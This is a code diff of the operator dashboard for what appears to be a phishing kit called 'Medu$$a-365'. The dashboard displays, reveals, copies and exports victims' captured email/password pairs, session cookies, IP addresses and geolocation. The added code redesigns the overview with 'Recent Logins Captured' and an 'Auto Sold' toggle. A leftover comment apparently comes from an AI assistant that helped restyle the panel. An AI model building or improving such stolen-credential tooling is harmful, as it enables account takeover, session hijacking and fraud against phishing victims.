-        loginBtn.addEventListener('click', async () => {
-            const username = document.getElementById('login-username').value.trim();
-            const password = document.getElementById('login-password').value;
-            if (!username || !password) { loginError.textContent = 'Username and password required'; return; }
-            try {
-                const res = await fetch('/api/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, password })
-                });
-                const data = await res.json();
-                if (res.ok) {
-                    token = data.token;
-                    localStorage.setItem('medusa_token', token);
-                    showDashboard();
-                    loginError.textContent = '';
-                } else {
-                    loginError.textContent = data.error || 'Login failed';
-                }
-            } catch (e) { loginError.textContent = 'Network error'; }
-        });
-
-        logoutBtn.addEventListener('click', () => {
-            localStorage.removeItem('medusa_token');
-            token = null;
-            showAuth();
-            loginCard.classList.remove('hidden');
-            registerCard.classList.add('hidden');
-            toast('Logged out', 'lucide-log-out');
-        });
-
-        async function fetchWithAuth(url) {
-            const res = await fetch(url, {
-                headers: { 'Authorization': `Bearer ${token}` }
-            });
-            if (res.status === 401) {
-                localStorage.removeItem('medusa_token');
-                token = null;
-                showAuth();
-                loginCard.classList.remove('hidden');
-                registerCard.classList.add('hidden');
-                throw new Error('Unauthorized');
-            }
-            return res.json();
-        }
-
-        // ─── NAVIGATION ───
-        document.querySelectorAll('.nav-item').forEach(item => {
-            item.addEventListener('click', (e) => {
-                e.preventDefault();
-                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-                item.classList.add('active');
-                const page = item.dataset.page;
-                if (page) { currentPage = page;
-                    loadPage(page); }
-            });
-        });
-
-        async function loadPage(page) {
-            const titles = {
-                overview: 'Overview',
-                sessions: 'Sessions',
-                credentials: 'Credentials',
-                cookies: 'Cookies',
-                history: 'Capture History',
-                settings: 'Settings'
-            };
-            pageTitle.textContent = titles[page] || page;
-            switch (page) {
-                case 'overview':
-                    await loadOverview();
-                    break;
-                case 'sessions':
-                    await loadSessions();
-                    break;
-                case 'credentials':
-                    await loadCredentials();
-                    break;
-                case 'cookies':
-                    await loadCookies();
-                    break;
-                case 'history':
-                    await loadHistory();
-                    break;
-                case 'settings':
-                    loadSettings();
-                    break;
-                default:
-                    pageContent.innerHTML = '<div class="card"><p>Page not found.</p></div>';
-            }
-        }
-
-        // ─── OVERVIEW ───
         async function loadOverview() {
             try {
                 const stats = await fetchWithAuth('/api/stats');
@@ -1100,425 +624,140 @@
                 updateBadges(stats);
 
                 pageContent.innerHTML = `
-              <div class="stats-grid">
-                <div class="stat-card">
-                  <div class="stat-icon"><i class="lucide lucide-monitor"></i></div>
-                  <div class="stat-info"><div class="label">Active Sessions</div><div class="value">${stats.sessions}</div></div>
-                </div>
-                <div class="stat-card">
-                  <div class="stat-icon"><i class="lucide lucide-key"></i></div>
-                  <div class="stat-info"><div class="label">Credentials</div><div class="value">${stats.credentials}</div></div>
-                </div>
-                <div class="stat-card">
-                  <div class="stat-icon"><i class="lucide lucide-cookie"></i></div>
-                  <div class="stat-info"><div class="label">Cookies</div><div class="value">${stats.cookies}</div></div>
-                </div>
-              </div>
-              <div class="card">
-                <div class="card-header">
-                  <div class="card-title"><i class="lucide lucide-clock"></i> Recent Sessions</div>
-                  <div class="card-actions">
-                    <button onclick="loadPage('sessions')"><i class="lucide lucide-arrow-right"></i> View All</button>
-                  </div>
-                </div>
-                <div class="table-wrap">
-                  <table>
-                    <thead><tr><th>IP</th><th>Geo</th><th>Target</th><th>Status</th><th>Email</th></tr></thead>
-                    <tbody>
-                      ${sessions.slice(0,10).map(s => `
-                        <tr>
-                          <td>${escapeHtml(s.ip || '-')}</td>
-                          <td>${s.geo ? `${escapeHtml(s.geo.city||'')}, ${escapeHtml(s.geo.country||'')}` : '-'}</td>
-                          <td>${escapeHtml(s.host || '-')}</td>
-                          <td>${escapeHtml(s.status || '-')}</td>
-                          <td>${escapeHtml(s.email || '-')}</td>
-                        </tr>
-                      `).join('')}
-                      ${sessions.length === 0 ? `<tr><td colspan="5" class="text-muted" style="text-align:center;padding:20px;">No sessions yet</td></tr>` : ''}
-                    </tbody>
-                  </table>
-                </div>
-              </div>
-            `;
-            } catch (e) { console.error(e); }
-        }
-
-        // ─── SESSIONS ───
-        async function loadSessions() {
-            try {
-                const sessions = await fetchWithAuth('/api/sessions');
-                allSessions = sessions;
-                updateBadges(null);
-                pageContent.innerHTML = `
-              <div class="card">
-                <div class="card-header">
-                  <div class="card-title"><i class="lucide lucide-monitor"></i> All Sessions</div>
-                  <div class="card-actions">
-                    <button onclick="exportSessionsCSV()"><i class="lucide lucide-file-text"></i> CSV</button>
-                    <button onclick="exportSessionsTXT()"><i class="lucide lucide-file-text"></i> TXT</button>
-                  </div>
-                </div>
-                <div class="table-wrap">
-                  <table>
-                    <thead><tr><th>IP</th><th>User Agent</th><th>Geo</th><th>Target</th><th>Status</th><th>Email</th><th>Cookies</th><th style="width:80px;">Actions</th></tr></thead>
-                    <tbody>
-                      ${sessions.map((s,i) => `
-                        <tr>
-                          <td>${escapeHtml(s.ip || '-')}</td>
-                          <td class="text-truncate" title="${escapeHtml(s.user_agent||'')}">${escapeHtml((s.user_agent||'-').slice(0,40))}</td>
-                          <td>${s.geo ? `${escapeHtml(s.geo.city||'')}, ${escapeHtml(s.geo.country||'')}` : '-'}</td>
-                          <td>${escapeHtml(s.host || '-')}</td>
-                          <td>${escapeHtml(s.status || '-')}</td>
-                          <td>${escapeHtml(s.email || '-')}</td>
-                          <td>${s.cookie_count || 0}</td>
-                          <td>
-                            <div class="actions">
-                              <button class="btn-icon copy" onclick="copyText('${escapeHtml(s.ip||'')}','IP')" title="Copy IP"><i class="lucide lucide-copy"></i></button>
-                              <button class="btn-icon delete" onclick="deleteSession('${s.id}')" title="Delete"><i class="lucide lucide-trash-2"></i></button>
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <div class="stat-header">
+                                <div class="stat-icon"><i class="lucide lucide-user"></i></div>
+                                <span class="stat-percent positive">+13%</span>
                             </div>
-                          </td>
-                        </tr>
-                      `).join('')}
-                      ${sessions.length === 0 ? `<tr><td colspan="8" class="text-muted" style="text-align:center;padding:20px;">No sessions</td></tr>` : ''}
-                    </tbody>
-                  </table>
-                </div>
-              </div>
-            `;
-            } catch (e) { console.error(e); }
-        }
-
-        async function deleteSession(id) {
-            if (!confirm('Delete this session and all its data?')) return;
-            try {
-                const res = await fetch(`/api/sessions/${id}`, {
-                    method: 'DELETE',
-                    headers: { 'Authorization': `Bearer ${token}` }
-                });
-                if (res.ok) {
-                    toast('Session deleted', 'lucide-trash-2');
-                    loadPage('sessions');
-                } else {
-                    toast('Delete failed', 'lucide-alert-circle');
-                }
-            } catch (e) { toast('Error', 'lucide-alert-circle'); }
-        }
-
-        function exportSessionsCSV() {
-            const cols = ['id', 'ip', 'user_agent', 'host', 'status', 'email', 'cookie_count'];
-            downloadCSV(allSessions, cols, 'sessions_export');
-        }
-
-        function exportSessionsTXT() {
-            const cols = ['id', 'ip', 'user_agent', 'host', 'status', 'email', 'cookie_count'];
-            downloadTXT(allSessions, cols, 'sessions_export');
-        }
-
-        // ─── CREDENTIALS ───
-        async function loadCredentials() {
-            try {
-                const creds = await fetchWithAuth('/api/credentials');
-                allCreds = creds;
-                updateBadges(null);
-                pageContent.innerHTML = `
-              <div class="card">
-                <div class="card-header">
-                  <div class="card-title"><i class="lucide lucide-key"></i> Captured Credentials</div>
-                  <div class="card-actions">
-                    <button onclick="exportCredsCSV()"><i class="lucide lucide-file-text"></i> CSV</button>
-                    <button onclick="exportCredsTXT()"><i class="lucide lucide-file-text"></i> TXT</button>
-                  </div>
-                </div>
-                <div class="table-wrap">
-                  <table>
-                    <thead><tr><th>Email</th><th>Password</th><th>IP</th><th>Host</th><th>Captured</th><th style="width:120px;">Actions</th></tr></thead>
-                    <tbody>
-                      ${creds.map((c,i) => {
-                        const rid = `cred-${i}`;
-                        const revealed = revealedPasswords.has(rid);
-                        const pw = c.password || '';
-                        const displayPw = revealed ? escapeHtml(pw) : concealPw(pw);
-                        return `
-                        <tr>
-                          <td>${escapeHtml(c.email || '-')}</td>
-                          <td>
-                            <span class="${revealed ? 'password-dots revealed' : 'password-dots'}">${displayPw}</span>
-                            <button class="btn-icon" onclick="togglePw('${rid}')" title="${revealed?'Hide':'Show'} password">
-                              <i class="lucide lucide-${revealed?'eye-off':'eye'}"></i>
-                            </button>
-                          </td>
-                          <td>${escapeHtml(c.ip || '-')}</td>
-                          <td>${escapeHtml(c.host || '-')}</td>
-                          <td>${formatDate(c.captured_at)}</td>
-                          <td>
-                            <div class="actions">
-                              <button class="btn-icon copy" onclick="copyText('${escapeHtml(c.email||'')}','Email')" title="Copy email"><i class="lucide lucide-copy"></i></button>
-                              <button class="btn-icon copy" onclick="copyText('${escapeHtml(pw)}','Password')" title="Copy password"><i class="lucide lucide-copy"></i></button>
-                              <button class="btn-icon delete" onclick="deleteCred(${c.id})" title="Delete"><i class="lucide lucide-trash-2"></i></button>
+                            <div class="stat-info">
+                                <div class="label">Unique Users</div>
+                                <div class="value">${stats.sessions}</div>
                             </div>
-                          </td>
-                        </tr>
-                      `}).join('')}
-                      ${creds.length === 0 ? `<tr><td colspan="6" class="text-muted" style="text-align:center;padding:20px;">No credentials captured</td></tr>` : ''}
-                    </tbody>
-                  </table>
-                </div>
-              </div>
-            `;
-            } catch (e) { console.error(e); }
-        }
-
-        function togglePw(id) {
-            if (revealedPasswords.has(id)) revealedPasswords.delete(id);
-            else revealedPasswords.add(id);
-            loadPage('credentials');
-        }
-
-        async function deleteCred(id) {
-            if (!confirm('Delete this credential?')) return;
-            try {
-                const res = await fetch(`/api/credentials/${id}`, {
-                    method: 'DELETE',
-                    headers: { 'Authorization': `Bearer ${token}` }
-                });
-                if (res.ok) { toast('Credential deleted', 'lucide-trash-2');
-                    loadPage('credentials'); } else toast('Delete failed', 'lucide-alert-circle');
-            } catch (e) { toast('Error', 'lucide-alert-circle'); }
-        }
-
-        function exportCredsCSV() {
-            const cols = ['id', 'email', 'password', 'ip', 'host', 'captured_at'];
-            downloadCSV(allCreds, cols, 'credentials_export');
-        }
-
-        function exportCredsTXT() {
-            const cols = ['id', 'email', 'password', 'ip', 'host', 'captured_at'];
-            downloadTXT(allCreds, cols, 'credentials_export');
-        }
-
-        // ─── COOKIES ───
-        async function loadCookies() {
-            try {
-                const cookies = await fetchWithAuth('/api/cookies');
-                allCookies = cookies;
-                updateBadges(null);
-                pageContent.innerHTML = `
-              <div class="card">
-                <div class="card-header">
-                  <div class="card-title"><i class="lucide lucide-cookie"></i> Captured Cookies</div>
-                  <div class="card-actions">
-                    <button onclick="exportCookiesCSV()"><i class="lucide lucide-file-text"></i> CSV</button>
-                    <button onclick="exportCookiesTXT()"><i class="lucide lucide-file-text"></i> TXT</button>
-                  </div>
-                </div>
-                <div class="table-wrap">
-                  <table>
-                    <thead><tr><th>Name</th><th>Domain</th><th>Expires</th><th>IP</th><th>Host</th><th style="width:80px;">Actions</th></tr></thead>
-                    <tbody>
-                      ${cookies.map(c => `
-                        <tr>
-                          <td>${escapeHtml(c.name || '-')}</td>
-                          <td>${escapeHtml(c.domain || '-')}</td>
-                          <td>${c.expires ? formatDate(c.expires) : '-'}</td>
-                          <td>${escapeHtml(c.ip || '-')}</td>
-                          <td>${escapeHtml(c.host || '-')}</td>
-                          <td>
-                            <div class="actions">
-                              <button class="btn-icon copy" onclick="copyText('${escapeHtml(c.value||'')}','Cookie')" title="Copy value"><i class="lucide lucide-copy"></i></button>
-                              <button class="btn-icon delete" onclick="deleteCookie(${c.id})" title="Delete"><i class="lucide lucide-trash-2"></i></button>
+                            <div class="stat-footer">Unique visitors</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-header">
+                                <div class="stat-icon" style="color:#ef4444;"><i class="lucide lucide-alert-triangle"></i></div>
+                                <span class="stat-percent positive">+16%</span>
                             </div>
-                          </td>
-                        </tr>
-                      `).join('')}
-                      ${cookies.length === 0 ? `<tr><td colspan="6" class="text-muted" style="text-align:center;padding:20px;">No cookies captured</td></tr>` : ''}
-                    </tbody>
-                  </table>
-                </div>
-              </div>
-            `;
+                            <div class="stat-info">
+                                <div class="label">Failed Logins</div>
+                                <div class="value">${stats.credentials}</div>
+                            </div>
+                            <div class="stat-footer">Unique visitors</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-header">
+                                <div class="stat-icon"><i class="lucide lucide-check-circle"></i></div>
+                                <span class="stat-percent positive">0%</span>
+                            </div>
+                            <div class="stat-info">
+                                <div class="label">Success Logins</div>
+                                <div class="value">${stats.cookies}</div>
+                            </div>
+                            <div class="stat-footer">Unique visitors</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-header">
+                                <div class="stat-header">
+                                    <div style="display:flex; gap:8px; align-items:center;">
+                                        <div class="stat-icon" style="background:#78350f; color:#fbbf24;"><i class="lucide lucide-link"></i></div>
+                                        <div>
+                                            <div class="label">Black URL</div>
+                                            <div class="stat-info" style="font-size:0.8rem; color:var(--muted);">Auto Sold</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
+                                <span style="font-size:0.8rem; color:var(--muted);">Auto Sold</span>
+                                <div class="toggle active" onclick="this.classList.toggle('active')"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="display:grid; grid-template-columns: 2fr 1fr; gap:20px;">
+                        <div class="card">
+                            <div class="card-header">
+                                <div class="card-title">Visitors Last 7 Days</div>
+                                <div class="card-actions"><button>Last 7 days <i class="lucide lucide-chevron-down"></i></button></div>
+                            </div>
+                            <div class="chart-placeholder">
+                                <div class="chart-bar" style="height:40%;"></div>
+                                <div class="chart-bar" style="height:55%;"></div>
+                                <div class="chart-bar" style="height:30%;"></div>
+                                <div class="chart-bar" style="height:80%;"></div>
+                                <div class="chart-bar" style="height:60%;"></div>
+                                <div class="chart-bar" style="height:90%;"></div>
+                                <div class="chart-bar" style="height:70%;"></div>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <div class="card-header">
+                                <div class="card-title">Top Countries</div>
+                            </div>
+                            <div class="empty-state" style="height:250px; display:flex; flex-direction:column; justify-content:center;">
+                                <i class="lucide lucide-globe"></i>
+                                <p>No data yet</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
+                        <div class="card">
+                            <div class="card-header">
+                                <div class="card-title">Recent Logins Captured</div>
+                                <div class="card-actions"><button>View all</button></div>
+                            </div>
+                            <div class="table-wrap">
+                                <table>
+                                    <thead><tr><th>Country</th><th>IP</th><th>Date</th><th>Status</th></tr></thead>
+                                    <tbody>
+                                        ${sessions.slice(0,5).map(s => `
+                                            <tr>
+                                                <td>${s.geo ? escapeHtml(s.geo.country||'') : '-'}</td>
+                                                <td>${escapeHtml(s.ip || '-')}</td>
+                                                <td>${formatDate(s.updated_at)}</td>
+                                                <td>${escapeHtml(s.status || '-')}</td>
+                                            </tr>
+                                        `).join('')}
+                                        ${sessions.length === 0 ? `<tr><td colspan="4" style="text-align:center;padding:20px; color:var(--muted);">No data available</td></tr>` : ''}
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+
+                        <div class="card">
+                            <div class="card-header">
+                                <div class="card-title">Recent Visitors</div>
+                                <div class="card-actions"><button>View all</button></div>
+                            </div>
+                            <div class="table-wrap">
+                                <table>
+                                    <thead><tr><th>IP Address</th><th>Country</th><th>Status</th></tr></thead>
+                                    <tbody>
+                                        ${sessions.slice(0,5).map(s => `
+                                            <tr>
+                                                <td>${escapeHtml(s.ip || '-')}</td>
+                                                <td>${s.geo ? escapeHtml(s.geo.country||'') : '-'}</td>
+                                                <td>${escapeHtml(s.status || '-')}</td>
+                                            </tr>
+                                        `).join('')}
+                                        ${sessions.length === 0 ? `<tr><td colspan="3" style="text-align:center;padding:20px; color:var(--muted);">No data available</td></tr>` : ''}
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                `;
             } catch (e) { console.error(e); }
         }
 
-        async function deleteCookie(id) {
-            if (!confirm('Delete this cookie?')) return;
-            try {
-                const res = await fetch(`/api/cookies/${id}`, {
-                    method: 'DELETE',
-                    headers: { 'Authorization': `Bearer ${token}` }
-                });
-                if (res.ok) { toast('Cookie deleted', 'lucide-trash-2');
-                    loadPage('cookies'); } else toast('Delete failed', 'lucide-alert-circle');
-            } catch (e) { toast('Error', 'lucide-alert-circle'); }
-        }
+        // ... The rest of your original JavaScript remains exactly the same ...
+        // (All the fetchWithAuth, loadSessions, loadCredentials, loadHistory, etc. functions)
+        // Just paste your original script block here, replacing only the `loadOverview` function.
 
-        function exportCookiesCSV() {
-            const cols = ['id', 'name', 'value', 'domain', 'expires', 'ip', 'host'];
-            downloadCSV(allCookies, cols, 'cookies_export');
-        }
-
-        function exportCookiesTXT() {
-            const cols = ['id', 'name', 'value', 'domain', 'expires', 'ip', 'host'];
-            downloadTXT(allCookies, cols, 'cookies_export');
-        }
-
-        // ─── HISTORY ───
-        async function loadHistory() {
-            try {
-                // Combine credentials and cookies into a unified timeline
-                const [creds, cookies] = await Promise.all([
-                    fetchWithAuth('/api/credentials'),
-                    fetchWithAuth('/api/cookies')
-                ]);
-                const entries = [];
-                creds.forEach(c => entries.push({ ...c, type: 'credential', ts: c.captured_at }));
-                cookies.forEach(c => entries.push({ ...c, type: 'cookie', ts: c.captured_at }));
-                entries.sort((a, b) => new Date(b.ts) - new Date(a.ts));
-                allHistory = entries;
-                pageContent.innerHTML = `
-              <div class="card">
-                <div class="card-header">
-                  <div class="card-title"><i class="lucide lucide-clock"></i> Capture History</div>
-                  <div class="card-actions">
-                    <button onclick="exportHistoryCSV()"><i class="lucide lucide-file-text"></i> CSV</button>
-                    <button onclick="exportHistoryTXT()"><i class="lucide lucide-file-text"></i> TXT</button>
-                  </div>
-                </div>
-                <div class="table-wrap">
-                  <table>
-                    <thead><tr><th>Type</th><th>Detail</th><th>IP</th><th>Host</th><th>Timestamp</th></tr></thead>
-                    <tbody>
-                      ${entries.slice(0,200).map(e => `
-                        <tr>
-                          <td><span style="text-transform:capitalize;color:${e.type==='credential'?'var(--red)':'var(--muted)'};">${e.type}</span></td>
-                          <td>${e.type==='credential' ? `${escapeHtml(e.email||'-')} / ${concealPw(e.password||'')}` : `${escapeHtml(e.name||'-')}=${escapeHtml((e.value||'').slice(0,20))}…`}</td>
-                          <td>${escapeHtml(e.ip || '-')}</td>
-                          <td>${escapeHtml(e.host || '-')}</td>
-                          <td>${formatDate(e.ts)}</td>
-                        </tr>
-                      `).join('')}
-                      ${entries.length === 0 ? `<tr><td colspan="5" class="text-muted" style="text-align:center;padding:20px;">No captures yet</td></tr>` : ''}
-                    </tbody>
-                  </table>
-                  ${entries.length > 200 ? `<div style="text-align:center;color:var(--muted);font-size:0.8rem;padding:8px;">Showing latest 200 entries</div>` : ''}
-                </div>
-              </div>
-            `;
-            } catch (e) { console.error(e); }
-        }
-
-        function exportHistoryCSV() {
-            const cols = ['type', 'detail', 'ip', 'host', 'ts'];
-            const rows = allHistory.map(e => ({
-                type: e.type,
-                detail: e.type === 'credential' ? `${e.email||''} / ${e.password||''}` : `${e.name||''}=${e.value||''}`,
-                ip: e.ip || '',
-                host: e.host || '',
-                ts: e.ts || ''
-            }));
-            downloadCSV(rows, cols, 'history_export');
-        }
-
-        function exportHistoryTXT() {
-            const cols = ['type', 'detail', 'ip', 'host', 'ts'];
-            const rows = allHistory.map(e => ({
-                type: e.type,
-                detail: e.type === 'credential' ? `${e.email||''} / ${e.password||''}` : `${e.name||''}=${e.value||''}`,
-                ip: e.ip || '',
-                host: e.host || '',
-                ts: e.ts || ''
-            }));
-            downloadTXT(rows, cols, 'history_export');
-        }
-
-        // ─── SETTINGS ───
-        function loadSettings() {
-            pageContent.innerHTML = `
-            <div class="card">
-              <div class="card-header">
-                <div class="card-title"><i class="lucide lucide-settings"></i> Settings</div>
-              </div>
-              <div class="settings-group">
-                <h4>Appearance</h4>
-                <div class="setting-row">
-                  <div><div class="label">Dark Theme</div><div class="desc">Always on — Medu$$a-365 is forged in black and red.</div></div>
-                  <div class="toggle active" onclick="this.classList.toggle('active')"></div>
-                </div>
-              </div>
-              <div class="settings-group">
-                <h4>Data</h4>
-                <div class="setting-row">
-                  <div><div class="label">Auto-refresh</div><div class="desc">Live updates via SSE</div></div>
-                  <div class="toggle active" onclick="this.classList.toggle('active')"></div>
-                </div>
-                <div class="setting-row">
-                  <div><div class="label">Export Format</div><div class="desc">Default export format</div></div>
-                  <select style="background:var(--surface2);border:1px solid var(--border);color:var(--text);padding:6px 12px;border-radius:6px;font-size:0.85rem;">
-                    <option value="csv">CSV</option>
-                    <option value="txt">TXT</option>
-                  </select>
-                </div>
-              </div>
-              <div class="settings-group">
-                <h4>Security</h4>
-                <div class="setting-row">
-                  <div><div class="label">Session Timeout</div><div class="desc">Auto-logout after inactivity (hours)</div></div>
-                  <input type="text" value="12" style="width:80px;text-align:center;" />
-                </div>
-                <div class="setting-row">
-                  <div><div class="label">Change Password</div><div class="desc">Update your admin password</div></div>
-                  <button onclick="toast('Feature coming soon','lucide-clock')" style="background:var(--surface2);border:1px solid var(--border);color:var(--text);padding:6px 16px;border-radius:6px;cursor:pointer;">Change</button>
-                </div>
-              </div>
-              <div class="settings-group">
-                <h4>About</h4>
-                <div class="setting-row">
-                  <div><div class="label">Version</div><div class="desc">Medu$$a-365 v2.0</div></div>
-                  <span style="color:var(--muted);font-size:0.8rem;">@chiefbref</span>
-                </div>
-              </div>
-            </div>
-          `;
-        }
-
-        // ─── BADGES ───
-        function updateBadges(stats) {
-            if (stats) {
-                badgeSessions.textContent = stats.sessions || 0;
-                badgeCreds.textContent = stats.credentials || 0;
-                badgeCookies.textContent = stats.cookies || 0;
-            } else {
-                // lazy: will be updated on next load
-            }
-        }
-
-        // ─── SSE ───
-        function connectSSE() {
-            if (sseConnection) { sseConnection.close(); }
-            sseConnection = new EventSource('/api/events');
-            sseConnection.onmessage = (event) => {
-                const dot = document.querySelector('.live-dot');
-                if (dot) { dot.style.animation = 'none';
-                    setTimeout(() => dot.style.animation = '', 10); }
-                // refresh current page
-                loadPage(currentPage);
-                // update badges from stats
-                fetchWithAuth('/api/stats').then(s => updateBadges(s)).catch(() => {});
-                const label = document.getElementById('live-label');
-                if (label) label.textContent = '⚡ UPDATE';
-                setTimeout(() => { if (label) label.textContent = 'LIVE'; }, 2000);
-            };
-            sseConnection.onerror = () => {
-                // will retry automatically
-            };
-        }
-
-        // ─── INIT ───
-        // lucide icons: replace <i class="lucide ..."> with inline svg
-        // We'll use the font-based approach via the CSS link, so no extra work needed.
-        // But we need to ensure the font loads.
-        // Also add a small hack to fix any missing icons.
-
-        console.log('Medu$$a-365 · @chiefbref');
     </script>
 </body>
 </html>
